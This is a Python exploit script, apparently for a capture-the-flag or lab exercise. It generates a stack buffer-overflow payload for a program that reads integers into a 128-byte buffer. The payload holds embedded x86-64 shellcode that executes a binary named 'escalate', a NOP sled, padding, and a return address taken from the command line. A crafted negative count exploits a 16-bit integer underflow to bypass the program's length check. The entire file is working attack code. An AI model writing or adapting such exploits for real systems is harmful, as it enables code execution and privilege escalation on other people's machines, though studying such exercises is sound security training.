import struct, sys


# Your shellcode (56 bytes)
raw_shellcode = b"\x48\x83\xc4\x80\x48\x31\xd2\x52\x48\xbb\x65\x73\x63\x61\x6c\x61\x74\x65\x53\x48\xbb\x61\x6c\x2f\x62\x69\x6e\x2f\x2f\x53\x48\xbb\x2f\x75\x73\x72\x2f\x6c\x6f\x63\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"

if len(sys.argv) != 3:
    raise ValueError("Please provide the following command line arguments: <byte_dist_buffer_head_to_return_address> <return_address>")

bytes_till_return_address = int(sys.argv[1])

tmp = bytes_till_return_address + 8

if len(raw_shellcode) > bytes_till_return_address:
    raise ValueError(f"Shellcode is too long to fit in the buffer till the return address ({len(raw_shellcode)} > {bytes_till_return_address}). Gotta reduce the shellcode size or increase the buffer size.")

# buffer is (32 ints -> 128 bytes), put the shellcode at the end and then nops before
nop_sled = b"\x90" * (32 * 4 - len(raw_shellcode))
buffer = nop_sled + raw_shellcode

# Get the return address from command line argument
return_address = struct.pack("<Q", int(sys.argv[2], 16))

# Get the padding between the end of the buffer and the return address
# which we pad with "A"s to reach the total overflow buffer size
padding_between_buffer_return_address = b"A" * (bytes_till_return_address - len(buffer))

overflow_buffer = buffer + padding_between_buffer_return_address + return_address

# till return address + 8 for return address and then round up to the nearest multiple of 4 for proper integer packing
total_overflow_buffer_size = len(overflow_buffer)

num_integer_input = int((total_overflow_buffer_size / 4) - (65535 + 1))   # use underflow to pass < 32 check but still get >= 32 integers potentially (num_integers fitting in buffer) - (max unsigned 16-bit integer + 1)

output = f"{num_integer_input}\n"

for i in range(0, total_overflow_buffer_size, 4):
    part_to_convert_to_int = overflow_buffer[i:i+4]
    
    decimal_value = int.from_bytes(part_to_convert_to_int, byteorder='little')
    
    output += f"{decimal_value}\n"

sys.stdout.buffer.write(output.encode())